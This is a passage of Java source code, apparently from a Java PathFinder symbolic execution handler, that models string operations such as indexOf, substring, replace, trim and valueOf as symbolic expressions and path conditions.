					String val = e1.asString();

					if (sym_v2 != null) { 
						if(s2char)
							result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2, intExp);
						else
							result = new StringConstant(val)._indexOf((StringExpression)sym_v2, intExp);
					} else {
						if (s2char) {
							result = new StringConstant(val)._indexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._indexOf(new StringConstant(val2), intExp);
						}
					}
				}
			}
			else { //intExp is null
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if(s2char)
							result = sym_v1._indexOf((IntegerExpression)sym_v2, new IntegerConstant(i1));
						else
							result = sym_v1._indexOf((StringExpression)sym_v2, new IntegerConstant(i1));
					} else { //sym_v1 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val), new IntegerConstant(i1));
							//System.out.println(""[handleIndexOf2] Special push"");
							//Special push?
							//th.push(s1, true);
						}
					}
				} else {//sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						if(s2char)
							result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2, new IntegerConstant(i1));
						else
							result = new StringConstant(val)._indexOf((StringExpression)sym_v2, new IntegerConstant(i1));
					} else {
						if (s2char) {
							result = new StringConstant(val)._indexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._indexOf(new StringConstant(val2), new IntegerConstant(i1));
						}
					}
				}
			}
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}
	
	public void handleLastIndexOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			handleLastIndexOf1(invInst, th);
		} else {
			handleLastIndexOf2(invInst, th);
		}
	}

	public void handleLastIndexOf1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		//boolean castException = false;
		StringExpression sym_v1 = null;
		StringExpression sym_v2 = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(1);
		/*	*/
		sym_v2 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null && sym_v2 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLastIndexOf1"");
		} else {
			boolean s1char = true; //argument is char
			if (sf.isOperandRef()) {
				s1char = false; //argument is string
			}
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2);
					} else {
						if (s1char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s1);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val));
						}
					}
				} else {//sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s2);
					String val = e1.asString();
					assert(sym_v2!=null);
					result = new StringConstant(val)._lastIndexOf(sym_v2);
					
				}
			
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}

	public void handleLastIndexOf2(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();

		StringExpression sym_v1 = null;
		StringExpression sym_v2 = null;
		IntegerExpression intExp = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(2);
		intExp = (IntegerExpression) sf.getOperandAttr(0);
		sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if (sym_v1 == null && sym_v2 == null && intExp == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLastIndexOf2"");
		} else {
			int i1 = sf.pop();
			boolean s2char = true;
			if (th.getModifiableTopFrame().isOperandRef()) {
				s2char = false;
			}
			
			int s2 = sf.pop();
			int s1 = sf.pop();

			IntegerExpression result = null;
			if (intExp != null) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2, intExp);
					} else {
						if (s2char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val), intExp);
						}
					}
				} else { //sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						result = new StringConstant(val)._lastIndexOf(sym_v2, intExp);
					} else {
						if (s2char) {
							result = new StringConstant(val)._lastIndexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._lastIndexOf(new StringConstant(val2), intExp);
						}
					}
				}
			}
			else { // intExp is null
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2, new IntegerConstant(i1));
					} else {
						if (s2char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val), new IntegerConstant(i1));
							//System.out.println(""[handleIndexOf2] Special push"");
							//Special push?
							//th.push(s1, true);
						}
					}
				} else { // sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					assert(sym_v2!=null);
					result = new StringConstant(val)._lastIndexOf(sym_v2, new IntegerConstant(i1));
				}
			}
			
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}


	

	public void handlebooleanValue(JVMInvokeInstruction invInst, SystemState ss, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandlebooleanValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - booleanValue"");
			}

		}

	}

	public void handleintValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleintValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				th.printStackTrace();
				throw new RuntimeException(""ERROR: operand type not tackled - intValue"");
			}
		}
	}

	public void handlelongValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: hanldeLongValue"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				sf.pushLong((long) 0);
				sf.setLongOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - longValue"");
			}

		}

	}

	public void handlefloatValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand: hanldeFloatValue"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				sf.push(0, false);
				sf.setOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - floatValue"");
			}

		}

	}

	public void handledoubleValue(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand: hanldeDoubleValue"");
		} else {
			if (sym_v3 instanceof RealExpression) {
				RealExpression sym_v2 = (RealExpression) sym_v3;
				sf.pop();
				sf.pushLong((long) 0);
				sf.setLongOperandAttr(sym_v2);
			} else {
				throw new RuntimeException(""ERROR: operand type not tackled - doubleValue"");
			}

		}

	}

	/*
	 * StringBuilder or StringBuffer or BigDecimal initiation with symbolic
	 * primitives
	 */

	public Instruction handleInit(JVMInvokeInstruction invInst,  ThreadInfo th) {

		String cname = invInst.getInvokedMethodClassName();
		if (cname.equals(""java.lang.StringBuilder"") || cname.equals(""java.lang.StringBuffer"")) {
			StackFrame sf = th.getModifiableTopFrame();
			StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
			SymbolicStringBuilder sym_v2 = (SymbolicStringBuilder) sf.getOperandAttr(1);
			if (sym_v1 == null) {
				throw new RuntimeException(""ERROR: symbolic StringBuilder method must have one symbolic operand in Init"");
			} else {
				sf.pop(); /* string object */
				sf.pop(); /* one stringBuilder Object */
				sym_v2.putstr(sym_v1);
				sf.setOperandAttr(sym_v2);
				return invInst.getNext();
			}
		} else {
			// Corina TODO: we should allow symbolic string analysis to kick in only when desired
			//throw new RuntimeException(""Warning Symbolic String Analysis: Initialization type not handled in symbc/bytecode/SymbolicStringHandler init"");
			return null;
		}
	}

	/***************************** Symbolic Big Decimal Routines end ****************/


	private void handleBooleanStringInstructions(JVMInvokeInstruction invInst,  ThreadInfo th, StringComparator comp) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleStartsWith"");
		} else {
			ChoiceGenerator<?> cg;
			boolean conditionValue;

			cg = th.getVM().getChoiceGenerator();
			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			// System.out.println(""conditionValue: "" + conditionValue);

			int s1 = sf.pop();
			int s2 = sf.pop();
			PathCondition pc;

			// pc is updated with the pc stored in the choice generator above
			// get the path condition from the
			// previous choice generator of the same type

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null) {
				pc = new PathCondition();
			} else {
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();
			}

			assert pc != null;

			if (conditionValue) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						pc.spc._addDet(comp, sym_v1, sym_v2);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val = e2.asString();
						pc.spc._addDet(comp, sym_v1, val);
					}
				} else {
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					pc.spc._addDet(comp, val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					// pc.solve();
					((PCChoiceGenerator) cg).setCurrentPC(pc);
					// System.out.println(((PCChoiceGenerator) cg).getCurrentPC());
				}
			} else {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						pc.spc._addDet(comp.not(), sym_v1, sym_v2);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val = e2.asString();
						pc.spc._addDet(comp.not(), sym_v1, val);

					}
				} else {
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();
					pc.spc._addDet(comp.not(), val, sym_v2);
				}
				if (!pc.simplify()) {// not satisfiable
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);

		}

	}

	public void handleEqualsIgnoreCase(JVMInvokeInstruction invInst,  ThreadInfo th) {
		throw new RuntimeException(""ERROR: symbolic string method not Implemented - EqualsIgnoreCase"");
	}

	public void handleEndsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - EndsWith"");
		handleBooleanStringInstructions(invInst,  th, StringComparator.ENDSWITH);
	}

	public void handleContains (JVMInvokeInstruction invInst,  ThreadInfo th) {
		handleBooleanStringInstructions(invInst,  th, StringComparator.CONTAINS);
	}


	public void handleStartsWith(JVMInvokeInstruction invInst,  ThreadInfo th) {
		//throw new RuntimeException(""ERROR: symbolic string method not Implemented - StartsWith"");
		handleBooleanStringInstructions(invInst, th, StringComparator.STARTSWITH);
	}

	//Only supports character for character
	public Instruction handleReplace(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleReplace"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.println(""[handleReplace] "" + s1 + "" "" + s2 + "" "" + s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				//ElementInfo e1 = th.getElementInfo(s1);
				String val = String.valueOf((char) s1);
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					//ElementInfo e2 = th.getElementInfo(s2);
					//String val1 = e2.asString();
					result = sym_v3._replace(val, String.valueOf((char)s2));
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(val, sym_v2);
					} else {
						result = sym_v3._replace(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						//ElementInfo e3 = th.getElementInfo(s3);
						String val2 = String.valueOf((char) s3);
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, val1);
					} else {
						//ElementInfo e2 = th.getElementInfo(s2);
						String val1 = String.valueOf((char) s2);
						result = sym_v3._replace(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replace(sym_v1, sym_v2);
					} else {
						result = sym_v3._replace(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			return handleSubString1(invInst, th);
		} else {
			return handleSubString2(invInst, th);
		}
	}

	public Instruction handleSubString1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);

		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString1"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				result = sym_v2._subString(val);
			} else {
				if (sym_v2 == null) {
					ElementInfo e1 = th.getElementInfo(s2);
					String val2 = e1.asString();
					sym_v2 = new StringConstant(val2);
					result = sym_v2._subString(sym_v1);
				} else {
					result = sym_v2._subString(sym_v1);
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public Instruction handleSubString2(JVMInvokeInstruction invInst, ThreadInfo th) {
		//System.out.println(""[SymbolicStringHandler] doing"");
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		IntegerExpression sym_v2 = (IntegerExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleSubString2"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();
			//System.out.printf(""[SymbolicStringHandler] popped %d %d %d\n"", s1, s2, s3);
			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				int val = s1;
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					int val1 = s2;
					result = sym_v3._subString(val, val1);
					//System.out.println(""[SymbolicStringHandler] special push"");
					/* Only if both arguments are concrete, something else needs
					 * to be pushed?
					 */
					//sf.push(s3, true); /* symbolic string element */
				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(val, sym_v2);
					} else {
						result = sym_v3._subString(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						int val1 = s2;
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, val1);
					} else {
						int val1 = s2;
						result = sym_v3._subString(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._subString(sym_v1, sym_v2);
					} else {
						result = sym_v3._subString(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.push(objRef.getObjectRef(), true);
			//System.out.println(""[SymbolicStringHandler] "" + sf.toString());
			sf.setOperandAttr(result);
		}

		return null;
	}

	public Instruction handleReplaceFirst(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		StringExpression sym_v3 = (StringExpression) sf.getOperandAttr(2);

		if ((sym_v1 == null) & (sym_v2 == null) & (sym_v3 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HanldeReplaceFirst"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();
			int s3 = sf.pop();

			StringExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete
				ElementInfo e1 = th.getElementInfo(s1);
				String val = e1.asString();
				if (sym_v2 == null) { // sym_v3 has to be symbolic
					ElementInfo e2 = th.getElementInfo(s2);
					String val1 = e2.asString();
					result = sym_v3._replaceFirst(val, val1);

				} else {
					if (sym_v3 == null) { // only sym_v2 is symbolic
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(val, sym_v2);
					} else {
						result = sym_v3._replaceFirst(val, sym_v2);
					}
				}
			} else { // sym_v1 is symbolic
				if (sym_v2 == null) {
					if (sym_v3 == null) {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, val1);
					} else {
						ElementInfo e2 = th.getElementInfo(s2);
						String val1 = e2.asString();
						result = sym_v3._replaceFirst(sym_v1, val1);
					}
				} else {
					if (sym_v3 == null) {
						ElementInfo e3 = th.getElementInfo(s3);
						String val2 = e3.asString();
						sym_v3 = new StringConstant(val2);
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					} else {
						result = sym_v3._replaceFirst(sym_v1, sym_v2);
					}
				}
			}
			ElementInfo objRef = th.getHeap().newString("""", th); /*
																																	 * dummy
																																	 * String
																																	 * Object
																																	 */
			sf.push(objRef.getObjectRef(), true);
			sf.setOperandAttr(result);
		}
		return null;
	}

	public void handleTrim(JVMInvokeInstruction invInst, ThreadInfo th) {
		// throw new RuntimeException(""ERROR: symbolic string method not Implemented - Trim"");
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		int s1 = sf.pop();

		if (sym_v1 == null) {
			ElementInfo e1 = th.getElementInfo(s1);
			String val1 = e1.asString();
			sym_v1 = new StringConstant(val1);
		}
		StringExpression result = sym_v1._trim();

		ElementInfo  objRef = th.getHeap().newString("""", th); /*
																																 * dummy String
																																 * Object
																																 */
		sf.push(objRef.getObjectRef(), true);
		sf.setOperandAttr(result);
	}

	public Instruction handleValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		MethodInfo mi = invInst.getInvokedMethod(th);
		String cname = invInst.getInvokedMethodClassName();
		String[] argTypes = mi.getArgumentTypeNames();
		if (cname.equals(""java.lang.String"")) {
			// System.out.println(argTypes[0]);
			if (argTypes[0].equals(""int"")) {
				return handleIntValueOf(invInst,  th);
			} else if (argTypes[0].equals(""float"")) {
				return handleFloatValueOf(invInst, th);
			} else if (argTypes[0].equals(""long"")) {
				return handleLongValueOf(invInst, th);
			} else if (argTypes[0].equals(""double"")) {
				return handleDoubleValueOf(invInst, th);
			} else if (argTypes[0].equals(""char"")) {
				return handleCharValueOf(invInst, th);
			} else if (argTypes[0].equals(""chararray"")) {
				return handleCharArrayValueOf(invInst, th);
			} else if (argTypes[0].equals(""boolean"")) {
				return handleBooleanValueOf(invInst, th);
			} else if (argTypes[0].equals(""java.lang.Object"")) {
				return handleObjectValueOf(invInst, th);
			} else {
				throw new RuntimeException(""ERROR: Input parameter type not handled in Symbolic String ValueOf"");
			}
		} else { // value of non-string types
			if (cname.equals(""java.lang.Integer"")) {
				if (!(argTypes[0].equals(""int""))) { // converting String to Integer
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseIntValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseIntValueOf(invInst,  th);
				}
			} else if (cname.equals(""java.lang.Float"")) {
				if (!(argTypes[0].equals(""float""))) { // converting String to Float
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseFloatValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseFloatValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Long"")) {
				if (!(argTypes[0].equals(""long""))) { // converting String to Long
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseLongValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Double"")) {
				if (!(argTypes[0].equals(""double""))) { // converting String to Double
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().getSystemState().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseDoubleValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseLongValueOf(invInst, th);
				}
			} else if (cname.equals(""java.lang.Boolean"")) {
				if (!(argTypes[0].equals(""boolean""))) { // converting String to Boolean
					ChoiceGenerator<?> cg;
					if (!th.isFirstStepInsn()) { // first time around
						cg = new PCChoiceGenerator(2);
						th.getVM().setNextChoiceGenerator(cg);
						return invInst;
					} else {
						handleParseBooleanValueOf(invInst, th);
					}
				} else { // converting int to Integer
					handleParseBooleanValueOf(invInst, th);
				}
			} else {
				throw new RuntimeException(""ERROR: Type not handled in Symbolic Type ValueOf: "" + cname);
			}
		}
		return null;
	}
	public void handleIsEmpty(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIsEmpty"");
		} else {
			IntegerExpression sym_v2 = sym_v1._length();
			ChoiceGenerator<?> cg;
			boolean conditionValue;
			cg = th.getVM().getChoiceGenerator();

			assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
			conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

			sf.pop();
			PathCondition pc;

			ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
			while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
				prev_cg = prev_cg.getPreviousChoiceGenerator();
			}

			if (prev_cg == null) {
				pc = new PathCondition();
			} else {
				pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();
			}

			assert pc != null;

			if(conditionValue){
				pc._addDet(Comparator.EQ, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}else{
				pc._addDet(Comparator.NE, sym_v2, (IntegerExpression)(new IntegerConstant(0)));
				if(!pc.simplify()) {
					th.getVM().getSystemState().setIgnored(true);
				} else {
					((PCChoiceGenerator) cg).setCurrentPC(pc);
				}
			}

			sf.push(conditionValue ? 1 : 0, true);
		}
	}

	public void handleParseLongValueOf(JVMInvokeInstruction invInst,  ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.popLong();
				int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
					pc = ((PCChoiceGenerator) prev_cg).getCurrentPC();

				assert pc != null;

				if (conditionValue) {
					pc.spc._addDet(StringComparator.ISLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						((PCChoiceGenerator) cg).setCurrentPC(pc);
						result = ((StringExpression) sym_v3)._IvalueOf();
						sf = th.getModifiableTopFrame();
						int objRef = getNewObjRef(invInst, th); /* dummy Long Object */
						sf.push(objRef, true);
						sf.setOperandAttr(result);
					}
				} else {
					pc.spc._addDet(StringComparator.NOTLONG, (StringExpression) sym_v3);
					if (!pc.simplify()) {// not satisfiable
						th.getVM().getSystemState().setIgnored(true);
					} else {
						throw new RuntimeException(""ERROR: Long Format Type Exception"");
						//th.getVM().getSystemState().setIgnored(true); TODO: needs revision
						//sf.push(0, true);
					}
				}
			}
		}
	}

	public void handleParseBooleanValueOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		Expression sym_v3 = (Expression) sf.getOperandAttr(0);

		if (sym_v3 == null) {
			throw new RuntimeException(""ERROR: symbolic method must have symbolic string operand"");
		} else {
			if (sym_v3 instanceof IntegerExpression) {
				IntegerExpression sym_v2 = (IntegerExpression) sym_v3;
				sf.pop();
				int objRef = getNewObjRef(invInst, th); /* dummy Boolean Object */
				sf.push(objRef, true);
				sf.setOperandAttr(sym_v2);
			} else {
				IntegerExpression result = null;
				ChoiceGenerator<?> cg;
				boolean conditionValue;
				cg = th.getVM().getChoiceGenerator();

				assert (cg instanceof PCChoiceGenerator) : ""expected PCChoiceGenerator, got: "" + cg;
				conditionValue = (Integer) cg.getNextChoice() == 0 ? false : true;

				sf.pop();
				PathCondition pc;

				ChoiceGenerator<?> prev_cg = cg.getPreviousChoiceGenerator();
				while (!((prev_cg == null) || (prev_cg instanceof PCChoiceGenerator))) {
					prev_cg = prev_cg.getPreviousChoiceGenerator();
				}

				if (prev_cg == null)
					pc = new PathCondition();
				else
